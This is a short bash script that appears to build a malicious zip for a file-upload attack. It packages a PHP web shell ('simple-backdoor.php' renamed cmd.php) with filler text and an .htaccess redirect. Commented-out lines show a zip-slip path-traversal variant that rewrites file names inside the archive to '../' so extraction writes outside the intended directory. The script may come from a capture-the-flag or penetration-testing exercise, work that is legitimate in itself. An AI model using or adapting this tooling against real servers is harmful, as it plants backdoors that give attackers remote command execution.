#!/bin/bash

rm cmd.zip

#for i in `seq 1 4`
#do 
#    FILE=$FILE"xxA"
#    cp simple-backdoor.php $FILE"cmd.php"
#done

cp simple-backdoor.php cmd.php

for i in `seq 1 50`
do
    echo "bullsh1t" >> textfile.txt
done

echo "Redirect 301 / http://www.domain.com/" > .htaccess

zip cmd.zip cmd.php textfile.txt .htaccess

#sed -i 's/xxA/..\//g' cmd.zip
rm cmd.php
rm textfile.txt
rm .htaccess
